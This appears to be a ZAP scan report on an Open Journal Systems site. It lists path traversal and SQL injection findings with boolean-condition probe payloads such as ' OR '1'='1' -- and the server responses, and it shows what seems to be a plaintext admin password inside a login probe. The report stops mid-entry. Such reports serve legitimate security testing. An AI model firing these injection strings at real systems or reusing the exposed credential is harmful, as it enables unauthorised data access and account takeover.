# ZAP OJS Scanning Report (Admin)

ZAP by [Checkmarx](https://checkmarx.com/).


## Summary of Alerts

| Risk Level | Number of Alerts |
| --- | --- |
| High | 3 |
| Medium | 0 |
| Low | 0 |
| Informational | 3 |




## Insights

| Level | Reason | Site | Description | Statistic |
| --- | --- | --- | --- | --- |
| Low | Warning |  | ZAP errors logged - see the zap.log file for details | 46    |
| Low | Warning |  | ZAP warnings logged - see the zap.log file for details | 5,947    |
| Low | Exceeded High | http://10.34.100.181 | Percentage of responses with status code 4xx | 51 % |
| Low | Exceeded High | http://10.34.100.181 | Percentage of slow responses | 56 % |
| Info | Informational | http://10.34.100.181 | Percentage of responses with status code 2xx | 70 % |
| Info | Informational | http://10.34.100.181 | Percentage of responses with status code 3xx | 6 % |
| Info | Informational | http://10.34.100.181 | Percentage of endpoints with content type application/json | 59 % |
| Info | Informational | http://10.34.100.181 | Percentage of endpoints with content type font/ttf | 6 % |
| Info | Informational | http://10.34.100.181 | Percentage of endpoints with content type font/woff | 6 % |
| Info | Informational | http://10.34.100.181 | Percentage of endpoints with content type font/woff2 | 6 % |
| Info | Informational | http://10.34.100.181 | Percentage of endpoints with content type image/png | 2 % |
| Info | Informational | http://10.34.100.181 | Percentage of endpoints with content type text/css | 2 % |
| Info | Informational | http://10.34.100.181 | Percentage of endpoints with content type text/html | 17 % |
| Info | Informational | http://10.34.100.181 | Percentage of endpoints with method GET | 46 % |
| Info | Informational | http://10.34.100.181 | Percentage of endpoints with method POST | 4 % |
| Info | Informational | http://10.34.100.181 | Percentage of endpoints with method PUT | 48 % |
| Info | Informational | http://10.34.100.181 | Count of total endpoints | 47    |




## Alerts

| Name | Risk Level | Number of Instances |
| --- | --- | --- |
| Path Traversal | High | 3 |
| SQL Injection | High | 47 |
| SQL Injection - Authentication Bypass | High | 7 |
| Authentication Request Identified | Informational | 1 |
| Session Management Response Identified | Informational | 25 |
| User Controllable HTML Element Attribute (Potential XSS) | Informational | 1 |




## Alert Detail



### [ Path Traversal ](https://www.zaproxy.org/docs/alerts/6/)



##### High (Low)

### Description

The Path Traversal attack technique allows an attacker access to files, directories, and commands that potentially reside outside the web document root directory. An attacker may manipulate a URL in such a way that the web site will execute or reveal the contents of arbitrary files anywhere on the web server. Any device that exposes an HTTP-based interface is potentially vulnerable to Path Traversal.

Most web sites restrict user access to a specific portion of the file-system, typically called the "web document root" or "CGI root" directory. These directories contain the files intended for user access and the executable necessary to drive web application functionality. To access files or execute commands anywhere on the file-system, Path Traversal attacks will utilize the ability of special-characters sequences.

The most basic Path Traversal attack uses the "../" special-character sequence to alter the resource location requested in the URL. Although most popular web servers will prevent this technique from escaping the web document root, alternate encodings of the "../" sequence may help bypass the security filters. These method variations include valid and invalid Unicode-encoding ("..%u2216" or "..%c0%af") of the forward slash character, backslash characters ("..\") on Windows-based servers, URL encoded characters "%2e%2e%2f"), and double URL encoding ("..%255c") of the backslash character.

Even if the web server properly restricts Path Traversal attempts in the URL path, a web application itself may still be vulnerable due to improper handling of user-supplied input. This is a common problem of web applications that use template mechanisms or load static text from files. In variations of the attack, the original URL parameter value is substituted with the file name of one of the web application's dynamic scripts. Consequently, the results can reveal source code because the file is interpreted as text instead of an executable script. These techniques often employ additional special characters such as the dot (".") to reveal the listing of the current working directory, or "%00" NULL characters in order to bypass rudimentary file extension checks.

* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/fetch-grid%3FsubmissionId=869&stageId=1&fileStage=18&assocType=520&assocId=1038&queryId=1016&noteId=%255Cfetch-grid&representationId=&_=1775676740355
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/fetch-grid (_,assocId,assocType,fileStage,noteId,queryId,representationId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `noteId`
  * Attack: `\fetch-grid`
  * Evidence: ``
  * Other Info: ``
* URL: http://10.34.100.181/ojs/index.php/jtkc/login%3Fsource=login
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/login (source)`
  * Method: `GET`
  * Parameter: `source`
  * Attack: `login`
  * Evidence: ``
  * Other Info: ``
* URL: http://10.34.100.181/ojs/index.php/index/login/signIn
  * Node Name: `http://10.34.100.181/ojs/index.php/index/login/signIn ()(csrfToken,password,remember,source,username)`
  * Method: `POST`
  * Parameter: `remember`
  * Attack: `/signIn`
  * Evidence: ``
  * Other Info: ``


Instances: 3

### Solution

Assume all input is malicious. Use an "accept known good" input validation strategy, i.e., use an allow list of acceptable inputs that strictly conform to specifications. Reject any input that does not strictly conform to specifications, or transform it into something that does. Do not rely exclusively on looking for malicious or malformed inputs (i.e., do not rely on a deny list). However, deny lists can be useful for detecting potential attacks or determining which inputs are so malformed that they should be rejected outright.

When performing input validation, consider all potentially relevant properties, including length, type of input, the full range of acceptable values, missing or extra inputs, syntax, consistency across related fields, and conformance to business rules. As an example of business rule logic, "boat" may be syntactically valid because it only contains alphanumeric characters, but it is not valid if you are expecting colors such as "red" or "blue."

For filenames, use stringent allow lists that limit the character set to be used. If feasible, only allow a single "." character in the filename to avoid weaknesses, and exclude directory separators such as "/". Use an allow list of allowable file extensions.

Warning: if you attempt to cleanse your data, then do so that the end result is not in the form that can be dangerous. A sanitizing mechanism can remove characters such as '.' and ';' which may be required for some exploits. An attacker can try to fool the sanitizing mechanism into "cleaning" data into a dangerous form. Suppose the attacker injects a '.' inside a filename (e.g. "sensi.tiveFile") and the sanitizing mechanism removes the character resulting in the valid filename, "sensitiveFile". If the input data are now assumed to be safe, then the file may be compromised. 

Inputs should be decoded and canonicalized to the application's current internal representation before being validated. Make sure that your application does not decode the same input twice. Such errors could be used to bypass allow list schemes by introducing dangerous inputs after they have been checked.

Use a built-in path canonicalization function (such as realpath() in C) that produces the canonical version of the pathname, which effectively removes ".." sequences and symbolic links.

Run your code using the lowest privileges that are required to accomplish the necessary tasks. If possible, create isolated accounts with limited privileges that are only used for a single task. That way, a successful attack will not immediately give the attacker access to the rest of the software or its environment. For example, database applications rarely need to run as the database administrator, especially in day-to-day operations.

When the set of acceptable objects, such as filenames or URLs, is limited or known, create a mapping from a set of fixed input values (such as numeric IDs) to the actual filenames or URLs, and reject all other inputs.

Run your code in a "jail" or similar sandbox environment that enforces strict boundaries between the process and the operating system. This may effectively restrict which files can be accessed in a particular directory or which commands can be executed by your software.

OS-level examples include the Unix chroot jail, AppArmor, and SELinux. In general, managed code may provide some protection. For example, java.io.FilePermission in the Java SecurityManager allows you to specify restrictions on file operations.

This may not be a feasible solution, and it only limits the impact to the operating system; the rest of your application may still be subject to compromise.


### Reference


* [ https://owasp.org/www-community/attacks/Path_Traversal ](https://owasp.org/www-community/attacks/Path_Traversal)
* [ https://cwe.mitre.org/data/definitions/22.html ](https://cwe.mitre.org/data/definitions/22.html)


#### CWE Id: [ 22 ](https://cwe.mitre.org/data/definitions/22.html)


#### WASC Id: 33

#### Source ID: 1

### [ SQL Injection ](https://www.zaproxy.org/docs/alerts/40018/)



##### High (Medium)

### Description

SQL injection may be possible.

* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/article-galleys/article-galley-grid/fetch-grid%3FsubmissionId=%2527&publicationId=869&_=1775676740347
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/article-galleys/article-galley-grid/fetch-grid (_,publicationId,submissionId)`
  * Method: `GET`
  * Parameter: `submissionId`
  * Attack: `'`
  * Evidence: `HTTP/1.0 500 Internal Server Error`
  * Other Info: ``
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/manage-query-note-files-grid/fetch-grid%3FsubmissionId=869&queryId=1016&noteId=1038&stageId=1&fileStage=18&assocType=520&assocId=%253B&representationId=&_=1775676740354
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/manage-query-note-files-grid/fetch-grid (_,assocId,assocType,fileStage,noteId,queryId,representationId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `assocId`
  * Attack: `;`
  * Evidence: `HTTP/1.0 500 Internal Server Error`
  * Other Info: ``
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/manage-query-note-files-grid/fetch-grid%3FsubmissionId=869&queryId=1016&noteId=1038&stageId=1&fileStage=18&assocType=520%2527&assocId=1038&representationId=&_=1775676740354
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/manage-query-note-files-grid/fetch-grid (_,assocId,assocType,fileStage,noteId,queryId,representationId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `assocType`
  * Attack: `520'`
  * Evidence: `HTTP/1.0 500 Internal Server Error`
  * Other Info: ``
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/manage-query-note-files-grid/fetch-grid%3FsubmissionId=869&queryId=1016&noteId=1038&stageId=1%253B&fileStage=18&assocType=520&assocId=1038&representationId=&_=1775676740354
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/manage-query-note-files-grid/fetch-grid (_,assocId,assocType,fileStage,noteId,queryId,representationId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `stageId`
  * Attack: `1;`
  * Evidence: `HTTP/1.0 500 Internal Server Error`
  * Other Info: ``
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/fetch-grid%3FsubmissionId=869&stageId=1&fileStage=18&assocType=520&assocId=1038&queryId=1016%253B&noteId=1038&representationId=&_=1775676740355
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/fetch-grid (_,assocId,assocType,fileStage,noteId,queryId,representationId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `queryId`
  * Attack: `1016;`
  * Evidence: `HTTP/1.0 500 Internal Server Error`
  * Other Info: ``
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/select-files%3FsubmissionId=869&stageId=1&fileStage=18&assocType=520&assocId=1038%2527%2528&queryId=1016&noteId=1038&representationId=&_=1775676740353
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/select-files (_,assocId,assocType,fileStage,noteId,queryId,representationId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `assocId`
  * Attack: `1038'(`
  * Evidence: `HTTP/1.0 500 Internal Server Error`
  * Other Info: ``
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/query-notes-grid/fetch-grid%3FqueryId=1000&submissionId=869&stageId=%2527%2528&_=1775676740350
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/query-notes-grid/fetch-grid (_,queryId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `stageId`
  * Attack: `'(`
  * Evidence: `HTTP/1.0 500 Internal Server Error`
  * Other Info: ``
* URL: http://10.34.100.181/ojs/index.php/jtkc/workflow/submissionProgressBar%3FsubmissionId=%2522&stageId=1&contextId=submission&_=1775676740340
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/workflow/submissionProgressBar (_,contextId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `submissionId`
  * Attack: `"`
  * Evidence: `HTTP/1.0 500 Internal Server Error`
  * Other Info: ``
* URL: http://10.34.100.181/ojs/index.php/index/login/signIn
  * Node Name: `http://10.34.100.181/ojs/index.php/index/login/signIn ()(csrfToken,password,remember,source,username)`
  * Method: `POST`
  * Parameter: `username`
  * Attack: `"`
  * Evidence: `HTTP/1.0 500 Internal Server Error`
  * Other Info: ``
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/manage-query-note-files-grid/update-query-note-files%3FsubmissionId=869&queryId=1016&noteId=1038&stageId=1%2527%2528&fileStage=18&assocType=520&assocId=1038&representationId=
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/manage-query-note-files-grid/update-query-note-files (assocId,assocType,fileStage,noteId,queryId,representationId,stageId,submissionId)(csrfToken,selectedFiles[],submitFormButton)`
  * Method: `POST`
  * Parameter: `stageId`
  * Attack: `1'(`
  * Evidence: `HTTP/1.0 500 Internal Server Error`
  * Other Info: ``
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/update-query%3FqueryId=1016&wasNew=1&submissionId=869&stageId=%2522
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/update-query (queryId,stageId,submissionId,wasNew)(comment,csrfToken,subject,submitFormButton,users[])`
  * Method: `POST`
  * Parameter: `stageId`
  * Attack: `"`
  * Evidence: `HTTP/1.0 500 Internal Server Error`
  * Other Info: ``
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/update-query%3FqueryId=1016&wasNew=1&submissionId=869%2527&stageId=1
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/update-query (queryId,stageId,submissionId,wasNew)(comment,csrfToken,subject,submitFormButton,users[])`
  * Method: `POST`
  * Parameter: `submissionId`
  * Attack: `869'`
  * Evidence: `HTTP/1.0 500 Internal Server Error`
  * Other Info: ``
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/article-galleys/article-galley-grid/fetch-grid%3FsubmissionId=869&publicationId=869+AND+1%253D1+--+&_=1775676740347
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/article-galleys/article-galley-grid/fetch-grid (_,publicationId,submissionId)`
  * Method: `GET`
  * Parameter: `publicationId`
  * Attack: `869 AND 1=1 -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [869 AND 1=1 -- ] and [869 AND 1=2 -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was returned for the original parameter.
The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/manage-query-note-files-grid/fetch-grid%3FsubmissionId=869&queryId=1016&noteId=1038&stageId=1&fileStage=18&assocType=522-2&assocId=1038&representationId=&_=1775676740354
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/manage-query-note-files-grid/fetch-grid (_,assocId,assocType,fileStage,noteId,queryId,representationId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `assocType`
  * Attack: `522-2`
  * Evidence: ``
  * Other Info: `The original page results were successfully replicated using the expression [522-2] as the parameter value
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/fetch-grid%3FsubmissionId=869&stageId=1&fileStage=18&assocType=520&assocId=1038&queryId=1016&noteId=1040-2&representationId=&_=1775676740355
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/fetch-grid (_,assocId,assocType,fileStage,noteId,queryId,representationId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `noteId`
  * Attack: `1040-2`
  * Evidence: ``
  * Other Info: `The original page results were successfully replicated using the expression [1040-2] as the parameter value
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/fetch-grid%3FsubmissionId=869&stageId=1&fileStage=18&assocType=520&assocId=1038&queryId=1016&noteId=2076%252F2&representationId=&_=1775676740355
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/fetch-grid (_,assocId,assocType,fileStage,noteId,queryId,representationId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `noteId`
  * Attack: `2076/2`
  * Evidence: ``
  * Other Info: `The original page results were successfully replicated using the expression [2076/2] as the parameter value
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/fetch-grid%3FqueryId=1016&noteId=1038&submissionId=869&stageId=1&_=1775676740359%2522+AND+%25221%2522%253D%25221%2522+--+
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/fetch-grid (_,noteId,queryId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `_`
  * Attack: `1775676740359" AND "1"="1" -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [1775676740359" AND "1"="1" -- ] and [1775676740359" AND "1"="2" -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was returned for the original parameter.
The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/fetch-grid%3FqueryId=1016%2527+AND+%25271%2527%253D%25271%2527+--+&noteId=1038&submissionId=869&stageId=1&_=1775676740359
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/fetch-grid (_,noteId,queryId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `queryId`
  * Attack: `1016' OR '1'='1' -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [1016' AND '1'='1' -- ] and [1016' OR '1'='1' -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was NOT returned for the original parameter.
The vulnerability was detected by successfully retrieving more data than originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/select-files%3FsubmissionId=869&stageId=1&fileStage=18&assocType=520&assocId=1038&queryId=1016&noteId=1038&representationId=&_=1775676740353%2527+AND+%25271%2527%253D%25271%2527+--+
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/select-files (_,assocId,assocType,fileStage,noteId,queryId,representationId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `_`
  * Attack: `1775676740353' AND '1'='1' -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [1775676740353' AND '1'='1' -- ] and [1775676740353' AND '1'='2' -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was returned for the original parameter.
The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/select-files%3FsubmissionId=869&stageId=1&fileStage=18+AND+1%253D1+--+&assocType=520&assocId=1038&queryId=1016&noteId=1038&representationId=&_=1775676740353
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/query/query-note-files-grid/select-files (_,assocId,assocType,fileStage,noteId,queryId,representationId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `fileStage`
  * Attack: `18 OR 1=1 -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [18 AND 1=1 -- ] and [18 OR 1=1 -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was NOT returned for the original parameter.
The vulnerability was detected by successfully retrieving more data than originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/submission/editor-submission-details-files-grid/fetch-grid%3FsubmissionId=869&stageId=1+AND+1%253D1+--+&_=1775676740344
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/files/submission/editor-submission-details-files-grid/fetch-grid (_,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `stageId`
  * Attack: `1 AND 1=1 -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [1 AND 1=1 -- ] and [1 AND 1=2 -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was returned for the original parameter.
The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/add-query%3FsubmissionId=869&stageId=1&_=1775676740351+AND+1%253D1+--+
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/add-query (_,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `_`
  * Attack: `1775676740351 AND 1=1 -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [1775676740351 AND 1=1 -- ] and [1775676740351 AND 1=2 -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was returned for the original parameter.
The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/add-query%3FsubmissionId=869&stageId=1+AND+1%253D1+--+&_=1775676740351
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/add-query (_,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `stageId`
  * Attack: `1 OR 1=1 -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [1 AND 1=1 -- ] and [1 OR 1=1 -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was NOT returned for the original parameter.
The vulnerability was detected by successfully retrieving more data than originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/fetch-grid%3FsubmissionId=869&stageId=1+AND+1%253D1+--+&_=1775676740345
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/fetch-grid (_,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `stageId`
  * Attack: `1 AND 1=1 -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [1 AND 1=1 -- ] and [1 AND 1=2 -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was returned for the original parameter.
The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/fetch-row%3FsubmissionId=869&stageId=1&rowId=1016&_=1775676740360%2527+AND+%25271%2527%253D%25271%2527+--+
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/fetch-row (_,rowId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `_`
  * Attack: `1775676740360' OR '1'='1' -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [1775676740360' AND '1'='1' -- ] and [1775676740360' OR '1'='1' -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was NOT returned for the original parameter.
The vulnerability was detected by successfully retrieving more data than originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/fetch-row%3FsubmissionId=869&stageId=1&rowId=1016+AND+1%253D1+--+&_=1775676740360
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/fetch-row (_,rowId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `rowId`
  * Attack: `1016 OR 1=1 -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [1016 AND 1=1 -- ] and [1016 OR 1=1 -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was NOT returned for the original parameter.
The vulnerability was detected by successfully retrieving more data than originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/participants%3FqueryId=1002-2&submissionId=869&stageId=1&_=1775676740349
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/participants (_,queryId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `queryId`
  * Attack: `1002-2`
  * Evidence: ``
  * Other Info: `The original page results were successfully replicated using the expression [1002-2] as the parameter value
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/participants%3FqueryId=1000&submissionId=869&stageId=1+AND+1%253D1+--+&_=1775676740349
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/queries/queries-grid/participants (_,queryId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `stageId`
  * Attack: `1 OR 1=1 -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [1 AND 1=1 -- ] and [1 OR 1=1 -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was NOT returned for the original parameter.
The vulnerability was detected by successfully retrieving more data than originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/users/author/author-grid/fetch-grid%3FsubmissionId=869&publicationId=869&_=1775676740346%2527+AND+%25271%2527%253D%25271%2527+--+
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/users/author/author-grid/fetch-grid (_,publicationId,submissionId)`
  * Method: `GET`
  * Parameter: `_`
  * Attack: `1775676740346' OR '1'='1' -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [1775676740346' AND '1'='1' -- ] and [1775676740346' OR '1'='1' -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was NOT returned for the original parameter.
The vulnerability was detected by successfully retrieving more data than originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/users/author/author-grid/fetch-grid%3FsubmissionId=869&publicationId=1738%252F2&_=1775676740346
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/users/author/author-grid/fetch-grid (_,publicationId,submissionId)`
  * Method: `GET`
  * Parameter: `publicationId`
  * Attack: `1738/2`
  * Evidence: ``
  * Other Info: `The original page results were successfully replicated using the expression [1738/2] as the parameter value
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/users/stage-participant/stage-participant-grid/fetch-grid%3FsubmissionId=869&stageId=1&_=1775676740343%2527+AND+%25271%2527%253D%25271%2527+--+
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/$$$call$$$/grid/users/stage-participant/stage-participant-grid/fetch-grid (_,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `_`
  * Attack: `1775676740343' OR '1'='1' -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [1775676740343' AND '1'='1' -- ] and [1775676740343' OR '1'='1' -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was NOT returned for the original parameter.
The vulnerability was detected by successfully retrieving more data than originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/notification/fetchNotification%3F_=1775676740363+AND+1%253D1+--+
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/notification/fetchNotification (_)`
  * Method: `GET`
  * Parameter: `_`
  * Attack: `1775676740363 AND 1=1 -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [1775676740363 AND 1=1 -- ] and [1775676740363 AND 1=2 -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was returned for the original parameter.
The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/workflow/submissionProgressBar%3FsubmissionId=869&stageId=1&contextId=submission&_=1775676740340+AND+1%253D1
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/workflow/submissionProgressBar (_,contextId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `_`
  * Attack: `1775676740340 AND 1=1`
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [1775676740340 AND 1=1] and [1775676740340 AND 1=2]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was returned for the original parameter.
The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/jtkc/workflow/submissionProgressBar%3FsubmissionId=869&stageId=2%252F2&contextId=submission&_=1775676740340
  * Node Name: `http://10.34.100.181/ojs/index.php/jtkc/workflow/submissionProgressBar (_,contextId,stageId,submissionId)`
  * Method: `GET`
  * Parameter: `stageId`
  * Attack: `2/2`
  * Evidence: ``
  * Other Info: `The original page results were successfully replicated using the expression [2/2] as the parameter value
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.`
* URL: http://10.34.100.181/ojs/index.php/index/login/signIn
  * Node Name: `http://10.34.100.181/ojs/index.php/index/login/signIn ()(csrfToken,password,remember,source,username)`
  * Method: `POST`
  * Parameter: `password`
  * Attack: `Admin@123 AND 1=1 -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [Admin@123 AND 1=1 -- ] and [Admin@123 AND 1=2 -- ]
The parameter value being modified was stripped from the HTML output for the purposes of the comparison.
Data was returned for the original parameter.
The vulnerability was detected by successfully restricting the data originally returned, by manipulating the parameter.`
* URL: http://10.34.100.181/ojs/index.php/index/login/signIn
  * Node Name: `http://10.34.100.181/ojs/index.php/index/login/signIn ()(csrfToken,password,remember,source,username)`
  * Method: `POST`
  * Parameter: `remember`
  * Attack: `1" AND "1"="1" -- `
  * Evidence: ``
  * Other Info: `The page results were successfully manipulated using the boolean conditions [1" AND "1"="1" -- ] and [1" AND "1"="2" -- ]
